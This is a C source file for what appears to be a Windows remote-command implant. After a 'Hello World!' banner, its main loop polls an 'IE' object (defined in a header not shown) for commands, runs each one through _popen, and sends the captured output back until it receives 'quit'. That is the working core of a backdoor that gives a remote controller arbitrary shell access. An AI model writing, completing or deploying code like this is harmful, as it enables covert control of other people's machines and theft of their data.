#include <stdio.h>
#include <stdlib.h>

#include "ie.h"
#include "config.h"
 
char* executeCommand(const char* command) 
{
	FILE* cmd = _popen(command, "rt");
	if (cmd == NULL) {
		perror("popen");
		return NULL;
	}

	size_t buffer_size = 512;
	char* result = (char*) malloc(buffer_size);
	int c;

	for (size_t i=0; ; i++) {
		if (i == buffer_size) {
			buffer_size *= 2;
			result = (char*) realloc(result, buffer_size);
		}
		c = fgetc(cmd);
		if (c == EOF) {
			result[i] = 0;
			break;
		} else {
			result[i] = (char) c;
		}
	}
	return result;
}


int main(int argc, char* argv[])
{
	printf("Hello World!\n");
	
	IE ie;

	char* command;
	char* result;

	SleepEx(1000, false);

	while (1) {
		command = ie.getCommand();
		if (command) {
			if (strcmp(command, "quit") == 0) {
				printf("quitting\n");
				break;
			} else {
				printf("command:\n%s\n", command);
				result = executeCommand(command);
				printf("result:\n%s\n***\n", result);
				ie.sendResult(result);
				free(command);
				free(result);
			}
		} else {
			printf("nothing to do\n");
		}
		SleepEx(POLL_INTERVAL * 1000, false);
	}

	
	return 0;
}

